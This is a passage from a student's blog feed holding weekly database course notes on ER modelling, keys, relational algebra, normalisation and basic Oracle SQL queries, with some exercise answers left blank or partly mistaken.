independence</strong> exists when you can change the data storage characteristics without affecting the program’s ability to access the data.</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202303021323674.jpg" data-fancybox="group" data-caption="w1hw" class="fancybox"><img alt="w1hw" title="w1hw" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202303021323674.jpg" class="lazyload"></a></p><hr><h1 id="week2"><a href="#week2" class="headerlink" title="week2"></a>week2</h1><p>照着课件进行了2个小时水水的增删改查学习，摸了<br>都是些概念东西了</p><h2 id="Database-design-life-cycle"><a href="#Database-design-life-cycle" class="headerlink" title="Database design life cycle"></a>Database design life cycle</h2><p><code>Requirements Definition</code> –&gt; <code>Conceptual Design</code> –&gt; <code>Logical Design</code> –&gt; <code>Physical Design</code></p><p><strong>Used for conceptual model (ERD)</strong><br><em>Entity-Relationship Diagram</em></p><h2 id="Requirements-Definition"><a href="#Requirements-Definition" class="headerlink" title="Requirements Definition"></a>Requirements Definition</h2><ul><li>Identify and analyse user views.</li><li>A ‘user view’ may be a report to be produced or a particular type of transaction that should be supported.</li><li>Corresponds to the external level of the ANSI&#x2F;SPARC architecture.</li><li>Output is a statement of specifications which describes the user views’ particular requirements and constraints.</li></ul><h2 id="Conceptual-Design"><a href="#Conceptual-Design" class="headerlink" title="Conceptual Design"></a>Conceptual Design</h2><ul><li>Develop the enterprise data model.</li><li>Independent of all physical implementation considerations (the type of database to be used).</li><li>In development try to <strong><font color="red">minimise redundancy within provided scenario however must not add anything outside scenario</font></strong></li><li>Various design methodologies may be employed such as UML, ER (Entity-Relationship) Modelling and Semantic Modelling.</li><li>ER consists of ENTITIES and RELATIONSHIPS between entities<ul><li>An ENTITY will have attributes (things we wish to record), one or more of which will identify an entity instance (called the KEY)</li></ul></li></ul><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202303091429697.jpg" data-fancybox="group" data-caption="undefined" class="fancybox"><img data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202303091429697.jpg" class="lazyload"></a></p><h2 id="Important-rule-for-Conceptual-Modelling"><a href="#Important-rule-for-Conceptual-Modelling" class="headerlink" title="Important rule for Conceptual Modelling"></a>Important rule for Conceptual Modelling</h2><ul><li><p><strong>All that is described in the brief has been included and all that has been included was described in the brief</strong></p><ul><li>Every entity, attribute and relationship described in the brief <strong>has been included</strong>, and</li><li><strong>Must not add</strong> entities, attributes and relationships which are not included as part of the brief, and</li></ul></li><li><p>In a real life scenario if there are concerns about features of the brief,<br>discuss with client</p><ul><li>For assignments:<ul><li>your client will be the ed forum</li><li>may make assumptions provided they do not violate this rule</li></ul></li></ul></li></ul><hr><h2 id="Logical-Design"><a href="#Logical-Design" class="headerlink" title="Logical Design"></a>Logical Design</h2><ul><li>Develop a data model which targets a particular database type (e.g. <strong>relational, hierarchical, network, object-oriented, noSQL</strong>).</li><li>Independent of any implementation details which are specific to any particular vendors DBMS package.</li><li>Normalisation technique is used to test the correctness of a relational logical model.</li></ul><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202303091446462.jpg" data-fancybox="group" data-caption="undefined" class="fancybox"><img data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202303091446462.jpg" class="lazyload"></a></p><p>P: Primary Key<br>F: Foreign Key</p><h2 id="Physical-Design"><a href="#Physical-Design" class="headerlink" title="Physical Design"></a>Physical Design</h2><ul><li>Develop a strategy for the physical implementation of the logical data model.</li><li>Choose appropriate storage structures, indexes, file organisations and access methods which will most efficiently support the user requirements (not part of unit).</li><li>Physical design phase(阶段，时期) is dependent on the particular DBMS in use.</li></ul><hr><h2 id="Weak-vs-Strong-Entity"><a href="#Weak-vs-Strong-Entity" class="headerlink" title="Weak vs Strong Entity"></a>Weak vs Strong Entity</h2><p><strong>Strong entity</strong></p><ul><li>Has a key which may be defined without reference to other entities.</li><li>For example EMPLOYEE entity.</li></ul><p><strong>Weak entity</strong></p><ul><li>Has a key which requires the existence of one or more other entities.</li><li>For example FAMILY entity - need to include the key of employee to create a suitable key for family</li></ul><p>Database designer often determines whether an entity can be described as weak based on business rules</p><ul><li>customer pays monthly account<ul><li>Key: cust_no, date_paid, or</li><li>Invented Key: payment_no (surrogate(代替的，代理的） – not at conceptual level)</li></ul></li></ul><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202303091516002.jpg" data-fancybox="group" data-caption="undefined" class="fancybox"><img data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202303091516002.jpg" class="lazyload"></a></p><h2 id="Types-of-Attributes"><a href="#Types-of-Attributes" class="headerlink" title="Types of Attributes"></a>Types of Attributes</h2><table><thead><tr><th>Simple</th><th>Composite</th></tr></thead><tbody><tr><td>Cannot be subdivided(细分)</td><td>Can be subdivided into additional attributes</td></tr><tr><td>Age, sex, marital(婚姻的) status</td><td>Address into street, city, zip</td></tr></tbody></table><table><thead><tr><th>Single-valued</th><th>Multi-valued</th></tr></thead><tbody><tr><td>Can have only a single value</td><td>Can have many values</td></tr><tr><td>Person has one social security number</td><td>Person may have several college degrees</td></tr></tbody></table><hr><h1 id="week3"><a href="#week3" class="headerlink" title="week3"></a>week3</h1><h2 id="Relational-Model"><a href="#Relational-Model" class="headerlink" title="Relational Model"></a>Relational Model</h2><p>Relational Model&amp;Relational Algebra关系模型与代数</p><h2 id="Q-amp-A"><a href="#Q-amp-A" class="headerlink" title="Q&amp;A"></a>Q&amp;A</h2><p>List all the super keys, candidate keys, and primary key for:</p><table><thead><tr><th>ENROLMENT</th><th>unitcode, stu_id, enrol_sem, enrol_year, enrol_mark, enrol_grade</th></tr></thead><tbody><tr><td>super keys</td><td></td></tr><tr><td>candidate keys</td><td></td></tr><tr><td>primary key</td><td></td></tr></tbody></table><h2 id="Assignment-1A"><a href="#Assignment-1A" class="headerlink" title="Assignment 1A"></a>Assignment 1A</h2><p>Clean Up Inc (CUI)<br>local authorities</p><p>Material Description<br>One area that is being looked at is reducing the amount of waste that is not recycled by charging more for waste which needs to go to landfill.</p><p>the PAYD program will charge residents based on the type and weight of waste which is collected from their property</p><p>entity 1: local authority<br>attribute 1: Name of local authority<br>attribute 2: officer’s name (including first and last names<br>attribute 3: contact telephone number<br>attribute 4: authority total area (square kilometers)<br>attribute 5: the type of authority</p><p>Entity : street<br>attribute 1: street id<br>attribute 2: street name<br>attribute 3: street length (meters<br>attribute 4: road_sur_type<br>attribute 5: num_lane</p><p>entity 2: property<br>attribute 1: street id<br>attribute 2: owner’s name<br>attribute 3: owner’s email address<br>attribute 4: owner’s phone number<br>attribute 5: owner id<br>attribute 6: bin type<br>attribute 7: bin RFID<br>attribute 8: bin supply date<br>attribute 9: reason of replacement</p><p>Entity : owner<br>attribute 2: owner’s name<br>attribute 3: owner’s email address<br>attribute 4: owner’s phone number<br>attribute 5: owner id</p><p>entity 3: waste<br>attribute 1: waste type id<br>attribute 2: waste type id<br>attribute 3: waste weight</p><p>entity 4:bin<br>attribute 1: bin REID id<br>attribute 2: bin supply cost<br>attribute 3: bin type<br>attribute 4: bin supply date<br>attribute 5: reason of replacement</p><p>entity 5: contract<br>attribute 1: contract number<br>attribute 2: start date<br>attribute 3: end date<br>attribute 4: Name of local authority<br>attribute 5: waste type<br>attribute 6: collection cost<br>attribute 7: bin type<br>attribute 8: bin supply cost<br>attribute 9: standard bin supply cost</p><hr><h1 id="week4"><a href="#week4" class="headerlink" title="week4"></a>week4</h1><h2 id="Relational-Model-Theory"><a href="#Relational-Model-Theory" class="headerlink" title="Relational Model Theory"></a>Relational Model Theory</h2><p>CUSTOMER (cust_id, cust_name, cust_address)<br>ORDER (order_id, order_date, cust_id)</p><p>discuss the two relations:</p><p><strong>CUSTOMER</strong></p><ol><li><p>Relation ：A Relation is a collection of rows (tuples) and columns (attributes). It is the table.<br>Ex: CUSTOMER </p></li><li><p>Attribute：Field or column (It is information&#x2F;characteristics about the Relation.<br>Ex: Customer relation has attributes &#x3D; Cust_id, Cust_name, Cust_address </p></li><li><p>Domain: Set of atomic values. Domain defines the permitted range of values for an attribute of an entity.<br>Ex: Cust_id INT NOT NULL<br>Cust_date DATE (2001-2010) </p></li><li><p>Tuple: Row&#x2F;Record of data</p></li></ol><table><thead><tr><th>Cust_id</th><th>Cust_name</th><th>Cust_address</th></tr></thead><tbody><tr><td>123</td><td>Mark Anthony</td><td>Clayton South 3169</td></tr></tbody></table><ol start="5"><li>Degree and cardinality of a relation: Degree of relation is the number of attributes. Degree of cardinality is the number of tuples, rows</li></ol><p>Ex: Customer entity has degree of relation &#x3D; 3, Order entity has degree of relation &#x3D; 3 </p><ol start="6"><li>Primary key and foreign key:  A primary key is a unique attribute that defines and identifies the object, whereas the foreign key is a unique (primary) key from a foreign entity (another table).</li></ol><p>Eg: Cust_id is PK for Customer relation. Cust_id is FK in Orders. </p><p>Primary Key: Cust_id in Customer<br>Foreign key: Cust_id in ORDER </p><p><strong>ORDER</strong> </p><ol><li>Attribute:</li></ol><p>Ex: Order entity has attributes &#x3D; order_id, order_date, cust_id </p><ol start="2"><li>Domain:</li></ol><p>Eg: Order_id; INT; not Null </p><ol start="3"><li>Tuple:</li></ol><table><thead><tr><th>Order_id</th><th>Order_date</th><th>Cust_id</th></tr></thead><tbody><tr><td>001</td><td>25&#x2F;03&#x2F;2023</td><td>123</td></tr></tbody></table><h2 id="Choosing-the-Primary-key"><a href="#Choosing-the-Primary-key" class="headerlink" title="Choosing the Primary key"></a>Choosing the Primary key</h2><p>In any relation, tuples must be unique. However, in many cases, the set of all the attributes in a relation is not considered a candidate key.<br>Why not? On the other hand, suppose we do have a relation where the set of all attributes is a candidate key. In this case, show that this set must, therefore, be the only candidate key and hence the primary key.</p><p><strong>The candidate key needs to be the minimal of the super key.</strong> </p><p><strong>Identify the primary key and foreign key for these three relations:</strong><br>ORDER (order_id, order_date, cust_id)<br>ORDERLINE (order_id, prod_no, ol_qtyordered, ol_lineprice)<br>PRODUCT (prod_no, prod_desc, prod_unitprice)</p><ul><li>Super key1 &#x3D; attribute1+attribute2.  </li><li>candidate Key1 &#x3D; attribute1+attribute2.  </li><li>Hence, Primary Key1&#x3D; candidateKey1.</li></ul><p>ORDER: order_id. ORDERLINE: order_id+prod_no; PRODUCT: prod_no </p><p><strong>APPOINMENT</strong> (dentist_id, dentist_name, patient_id, patient_name, appointment_datetime, surgery_roomno) </p><p><strong>Superkeys</strong>: </p><p>Superkey 1: dentist_id, dentist_name, patient_id, patient_name, appointment_datetime,surgery_roomno </p><p>Superkey 2: dentist_id, dentist_name, patient_id, patient_name, appointment_datetime </p><p>Superkey 3: destist_id, dentist_name, patient_id, appointment_datetime </p><p>Superkey 4: destist_id, patient_id, patient_name, appointment_datetime </p><p>Superkey 5: dentist_id, patient_id, appointment_datetime </p><p>Superkey 6: destist_id, appointment_datetime</p><p>Superkey 7: patient_id, appointment_datetime </p><p><strong>Candidate Keys</strong>:<br>Candidate key 1: dentist_id, appointment_datetime  </p><p>Candidate Key 2: surgery_roomno, appointment_datetime </p><p>Candidate Key 3: patient_id, appointment_datetime </p><p><strong>Primary Keys</strong>: dentist_id, patient_id</p><hr><h2 id="Relational-Algebra-Q1"><a href="#Relational-Algebra-Q1" class="headerlink" title="Relational Algebra Q1"></a>Relational Algebra Q1</h2><p>HOTEL (hotel_no, hotel_name, hotel_city)<br>ROOM (room_no, hotel_no, room_type, room_price)<br>BOOKING (hotel_no, guest_no, bdate_from, bdate_to, room_no)<br>GUEST (guest_no, guest_name, guest_address)</p><p>Write the relational algebra for the following queries (your answer must show an understanding of query efficiency ie. you must not make use of unnecessary joins, nor carry attributes and tuples up through the query which are not necessary) :</p><ol><li><p>List the numbers, names and cities of all hotels<br>R1 &#x3D; π hotel_no, hotel_name, hotel_city </p></li><li><p>List all single rooms with a price below $50<br>R2 &#x3D; σ room_type &#x3D; ‘single’ and room_price &lt; 50</p></li><li><p>List the numbers and names of all hotels in Melbourne<br>R1 &#x3D; </p></li><li><p>List all numbers and names of hotels which have a presidential suite room</p></li><li><p>List the price and type of all rooms at the Grosvenor Hotel</p></li><li><p>List all numbers, names and addresses of guests currently staying in deluxe room of any<br>hotel (assume that if the guest has a tuple in the BOOKING relation, then they are currently<br>staying in the hotel)</p></li><li><p>List all numbers, names and addresses of guests currently staying at the Grosvenor Hotel<br>(assume that if the guest has a tuple in the BOOKING relation, then they are currently<br>staying in the hotel)</p></li></ol><hr><h2 id="Relational-Algebra-Q2"><a href="#Relational-Algebra-Q2" class="headerlink" title="Relational Algebra Q2"></a>Relational Algebra Q2</h2><p>Considers these four relations:<br>CUSTOMER (cust_id, cust_name, cust_address)<br>PRODUCT (prod_id, prod_desc, prod_unitprice, prod_stock)<br>STAFF (staff_name, staff_position)<br>SALE (cust_id, sale_date, prod_id, sale_qty, sold_by)</p><p>*Note that sold_by value is the name of staff who made the sale<br>also refer to the following tables as seen in an RDBMS </p><p><strong>CUSTOMER</strong></p><table><thead><tr><th>cust_id</th><th>cust_name</th><th>cust_address</th></tr></thead><tbody><tr><td>111</td><td>Clive</td><td>India Rd</td></tr><tr><td>112</td><td>Clark</td><td>Kent St</td></tr><tr><td>113</td><td>Charles</td><td>Windsor Av</td></tr><tr><td>114</td><td>Cilla</td><td>Black St</td></tr></tbody></table><p><strong>PRODUCT</strong></p><table><thead><tr><th>Prod_id</th><th>Prod_desc</th><th>Prod_unitprice</th><th>Prod_stock</th></tr></thead><tbody><tr><td>K3</td><td>Knife Set</td><td>$17.95</td><td>105</td></tr><tr><td>K5</td><td>Ladle</td><td>$6.95</td><td>0</td></tr><tr><td>K11</td><td>Scraper</td><td>$0.95</td><td>66</td></tr><tr><td>L12</td><td>Rack</td><td>$22.95</td><td>0</td></tr><tr><td>L3</td><td>Table</td><td>$399.50</td><td>4</td></tr><tr><td>L6</td><td>Stool</td><td>$17.95</td><td>13</td></tr></tbody></table><p><strong>STAFF</strong></p><table><thead><tr><th>Staff_name</th><th>Staff_position</th></tr></thead><tbody><tr><td>Clark</td><td>Manager</td></tr><tr><td>Simon</td><td>Clerk</td></tr><tr><td>Steve</td><td>Packer</td></tr><tr><td>Sean</td><td>Clerk</td></tr><tr><td>Sorcha</td><td>Director</td></tr><tr><td>Charles</td><td>Clerk</td></tr></tbody></table><p><strong>SALE</strong></p><table><thead><tr><th>Cust__id</th><th>Sale_date</th><th>Prod_id</th><th>Sale_qty</th><th>Sold_by</th></tr></thead><tbody><tr><td>112</td><td>20170311</td><td>K3</td><td>6</td><td>Simon</td></tr><tr><td>114</td><td>20170121</td><td>K11</td><td>1</td><td>Simon</td></tr><tr><td>114</td><td>20170123</td><td>K11</td><td>1</td><td>Simon</td></tr><tr><td>113</td><td>20161130</td><td>L12</td><td>5</td><td>Sorcha</td></tr><tr><td>114</td><td>20170228</td><td>L12</td><td>1</td><td>Sean</td></tr><tr><td>113</td><td>20161129</td><td>K3</td><td>2</td><td>Sean</td></tr></tbody></table><p>Using Relational Algebra, answer the following queries.</p><ol><li><p>List ids, names of customers and descriptions of products bought by the customer. How<br>many tuples will be returned by the relational algebra query that you have constructed as<br>your answer?<br><strong>π</strong>cust_id, cust_name, prod_desc (CUSTOMER ⨝ SALE ⨝ PRODUCT)</p></li><li><p>List all names which are shared by customers and staff<br><strong>π</strong>cust_name (CUSTOMER) ∩ <strong>π</strong>staff_name (STAFF)</p></li><li><p>List ids and descriptions of products that haven’t been sold<br><strong>π</strong>prod_id, prod_desc (PRODUCT - SALE)</p></li><li><p>List names of clerks who don’t have any sales yet<br>πstaff_name (STAFF) - πsold_by (SALE)</p></li><li><p>List categories (positions) of staff who have made sales<br><strong>π</strong>staff_position (STAFF ⨝ SALE)</p></li></ol><hr><h2 id="Workshop"><a href="#Workshop" class="headerlink" title="Workshop"></a>Workshop</h2><p>Insert, Update, Delete</p><hr><h1 id="week5"><a href="#week5" class="headerlink" title="week5"></a>week5</h1><h2 id="Applied-UNF-1"><a href="#Applied-UNF-1" class="headerlink" title="Applied UNF 1"></a>Applied UNF 1</h2><p><strong>UNF</strong><br><strong>APPOINTMENT</strong> (dentist_no, dentist_name, patient_no,patient_name, app_datetime, surgeryroom_no) </p><p><strong>1NF</strong><br><strong>APPOINTMENT</strong> (dentist_no, dentist_name, patient_no,patient_name, app_datetime, surgeryroom_no) </p><p>(<strong>PARTIAL dependences</strong>)<br><strong>DENTIST</strong> (dentist_no, dentist_name)<br><strong>PATIENT</strong> (patient_no,patient_name)</p><p><strong>2NF</strong><br><strong>DENTIST</strong> (dentist_no, dentist_name)<br><strong>PATIENT</strong> (patient_no,patient_name)<br><strong>APPOINTMENT</strong> (dentist_no, patient_no, app_datetime, surgeryroom_no) </p><p><strong>3NF</strong><br>APPOINTMENT (dentist_no, dentist_name, app_datetime)<br>APPOINTMENT（patient_no,patient_name, app_datetime, surgeryroom_no） </p><hr><h1 id="week7"><a href="#week7" class="headerlink" title="week7"></a>week7</h1><h2 id="Creating-and-Altering-the-Database"><a href="#Creating-and-Altering-the-Database" class="headerlink" title="Creating and Altering the Database"></a>Creating and Altering the Database</h2><h2 id="Cascade-Constraints"><a href="#Cascade-Constraints" class="headerlink" title="Cascade Constraints"></a>Cascade Constraints</h2><p>Cascading Referential Integrity Constraints in SQL Server are the foreign key constraints that tell SQL Server to perform certain actions whenever a user attempts to delete or update a primary key to which an existing foreign keys point.</p><p><strong>column constraints couldn’t use in 2 primary key component;  need to use in table constraints</strong></p><hr><h1 id="week9"><a href="#week9" class="headerlink" title="week9"></a>week9</h1><h2 id="applied-class"><a href="#applied-class" class="headerlink" title="applied class"></a>applied class</h2><h3 id="some-tricks"><a href="#some-tricks" class="headerlink" title="some tricks"></a>some tricks</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">desc</span> uni.student;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- to_date: converts from a string to a date according to a format string</span></span><br><span class="line"><span class="keyword">SELECT</span></span><br><span class="line">    stuid,</span><br><span class="line">    studob</span><br><span class="line"><span class="keyword">FROM</span></span><br><span class="line">    uni.student</span><br><span class="line"><span class="keyword">WHERE</span></span><br><span class="line">    studob <span class="operator">&gt;</span> TO_DATE(<span class="string">&#x27;01/Jan/2000&#x27;</span>, <span class="string">&#x27;dd/Mon/yyy&#x27;</span>)</span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> stuid;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- to_char: converts from a date to a string according to a format string</span></span><br><span class="line"><span class="keyword">SELECT</span></span><br><span class="line">    to_char(sysdate, <span class="string">&#x27;dd/Mon/yyyy hh:mi:ss AM&#x27;</span>) <span class="keyword">AS</span> server_date</span><br><span class="line"><span class="keyword">FROM</span></span><br><span class="line">    dual;</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span></span><br><span class="line">    to_char(sysdate <span class="operator">+</span> <span class="number">10</span> <span class="operator">/</span> <span class="number">24</span>, <span class="string">&#x27;hh24:mi:ss&#x27;</span>) <span class="keyword">AS</span> server_time_plus_10_hrs</span><br><span class="line"><span class="keyword">FROM</span></span><br><span class="line">    dual;</span><br></pre></td></tr></table></figure></div><h3 id="Retrieving-data-from-a-single-table"><a href="#Retrieving-data-from-a-single-table" class="headerlink" title="Retrieving data from a single table"></a>Retrieving data from a single table</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- A4</span></span><br><span class="line"><span class="keyword">SELECT</span></span><br><span class="line">    stuid,</span><br><span class="line">    stufname,</span><br><span class="line">    stulname,</span><br><span class="line">    stuaddress</span><br><span class="line"><span class="keyword">FROM</span></span><br><span class="line">    uni.student</span><br><span class="line"><span class="keyword">WHERE</span></span><br><span class="line">    stufname <span class="keyword">LIKE</span> <span class="string">&#x27;S%&#x27;</span></span><br><span class="line">    <span class="keyword">AND</span> stulname <span class="keyword">LIKE</span> <span class="string">&#x27;%i%&#x27;</span></span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span></span><br><span class="line">    stuid;</span><br><span class="line"><span class="comment">-- A5</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">-- A6</span></span><br><span class="line"><span class="keyword">SELECT</span></span><br><span class="line">    unitcode,</span><br><span class="line">    ofyear,</span><br><span class="line">    ofsemester</span><br><span class="line"><span class="keyword">FROM</span></span><br><span class="line">    uni.offering</span><br><span class="line"><span class="keyword">WHERE</span></span><br><span class="line">    to_char(ofyear, <span class="string">&#x27;yyyy&#x27;</span>) <span class="operator">=</span> <span class="string">&#x27;2021&#x27;</span></span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span></span><br><span class="line">    unitcode,</span><br><span class="line">    ofsemester;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- A7</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">-- A8</span></span><br><span class="line"><span class="keyword">SELECT</span></span><br><span class="line">    stuid,</span><br><span class="line">    unitcode,</span><br><span class="line">    enrolmark,</span><br><span class="line">    ofyear,</span><br><span class="line">    ofsemester</span><br><span class="line"><span class="keyword">FROM</span></span><br><span class="line">    uni.enrolment</span><br><span class="line"><span class="keyword">WHERE</span></span><br><span class="line">    to_char(ofyear, <span class="string">&#x27;yyyy&#x27;</span>) <span class="operator">=</span> <span class="string">&#x27;2021&#x27;</span></span><br><span class="line">    <span class="keyword">AND</span> ofsemester <span class="operator">=</span> <span class="number">2</span></span><br><span class="line">    <span class="keyword">AND</span> enrolmark <span class="operator">&lt;</span> <span class="number">50</span></span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span></span><br><span class="line">    stuid,</span><br><span class="line">    unitcode;</span><br></pre></td></tr></table></figure></div><h3 id="Retrieving-data-from-multiple-tables"><a href="#Retrieving-data-from-multiple-tables" class="headerlink" title="Retrieving data from multiple tables"></a>Retrieving data from multiple tables</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- B1</span></span><br><span class="line"><span class="keyword">SELECT</span></span><br><span class="line">    unitcode,</span><br><span class="line">    ofsemester,</span><br><span class="line">    stafffname,</span><br><span class="line">    stafflname,</span><br><span class="line">    ofyear</span><br><span class="line"><span class="keyword">FROM</span></span><br><span class="line">         uni.staff</span><br><span class="line">    <span class="keyword">JOIN</span> uni.offering <span class="keyword">ON</span> staff.staffid <span class="operator">=</span> offering.staffid</span><br><span class="line"><span class="keyword">WHERE</span></span><br><span class="line">        to_char(ofyear, <span class="string">&#x27;yyyy&#x27;</span>) <span class="operator">=</span> <span class="string">&#x27;2021&#x27;</span></span><br><span class="line">    <span class="keyword">AND</span> ofsemester <span class="operator">=</span> <span class="number">2</span></span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span></span><br><span class="line">    ofsemester,</span><br><span class="line">    unitcode</span><br><span class="line"></span><br><span class="line"><span class="comment">-- B2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">-- B3</span></span><br><span class="line"><span class="keyword">SELECT</span></span><br><span class="line">    s.stuid,</span><br><span class="line">    s.stufname<span class="operator">||</span> <span class="string">&#x27; &#x27;</span> <span class="operator">||</span> s.stulname <span class="keyword">as</span> stuname,</span><br><span class="line">    u.unitname,</span><br><span class="line">    e.ofsemester,</span><br><span class="line">    e.ofyear</span><br><span class="line"><span class="keyword">FROM</span></span><br><span class="line">    uni.enrolment e</span><br><span class="line">    <span class="keyword">JOIN</span> uni.student s <span class="keyword">ON</span> e.stuid <span class="operator">=</span> s.stuid</span><br><span class="line">    <span class="keyword">JOIN</span> uni.unit u <span class="keyword">ON</span> e.unitcode <span class="operator">=</span> u.unitcode</span><br><span class="line"><span class="keyword">WHERE</span></span><br><span class="line">    to_char(e.ofyear, <span class="string">&#x27;yyyy&#x27;</span>) <span class="operator">=</span> <span class="string">&#x27;2021&#x27;</span></span><br><span class="line">    <span class="keyword">AND</span> e.ofsemester <span class="operator">=</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span></span><br><span class="line">    u.unitname,</span><br><span class="line">    e.stuid;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- B6</span></span><br><span class="line"><span class="keyword">SELECT</span></span><br><span class="line">    u.unitcode,</span><br><span class="line">    unitname,</span><br><span class="line">    ofsemester,</span><br><span class="line">    to_char(ofyear, <span class="string">&#x27;yyyy&#x27;</span>) <span class="keyword">AS</span> <span class="keyword">year</span>,</span><br><span class="line">    nvl(to_char(enrolmark, <span class="string">&#x27;99&#x27;</span>),</span><br><span class="line">        <span class="string">&#x27;N/A&#x27;</span>)              <span class="keyword">AS</span> mark,</span><br><span class="line">    nvl(enrolgrade, <span class="string">&#x27;N/A&#x27;</span>)  <span class="keyword">AS</span> grade</span><br><span class="line"><span class="keyword">FROM</span></span><br><span class="line">         uni.enrolment e</span><br><span class="line">    <span class="keyword">JOIN</span> uni.unit     u <span class="keyword">ON</span> e.unitcode <span class="operator">=</span> u.unitcode</span><br><span class="line">    <span class="keyword">JOIN</span> uni.student s <span class="keyword">ON</span> s.stuid <span class="operator">=</span> e.stuid</span><br><span class="line"><span class="keyword">WHERE</span></span><br><span class="line">    <span class="built_in">lower</span>(s.stufname) <span class="operator">=</span> <span class="built_in">lower</span>(<span class="string">&#x27;Brier&#x27;</span>)</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span></span><br><span class="line">    ofsemester,</span><br><span class="line">    unitcode;</span><br></pre></td></tr></table></figure></div>]]></content>
    
    
    <summary type="html">好好学习天天向上</summary>
    
    
    
    <category term="Monash笔记" scheme="https://manayakko.github.io/yakko117/categories/Monash%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="Monash Cs" scheme="https://manayakko.github.io/yakko117/tags/Monash-Cs/"/>
    
  </entry>
  
  <entry>
    <title>Monash Courses 2023S1 FIT9137</title>
    <link href="https://manayakko.github.io/yakko117/2023/02/26/MonashCs9137/"/>
    <id>https://manayakko.github.io/yakko117/2023/02/26/MonashCs9137/</id>
    <published>2023-02-26T05:38:40.481Z</published>
    <updated>2023-05-22T00:06:51.320Z</updated>
    
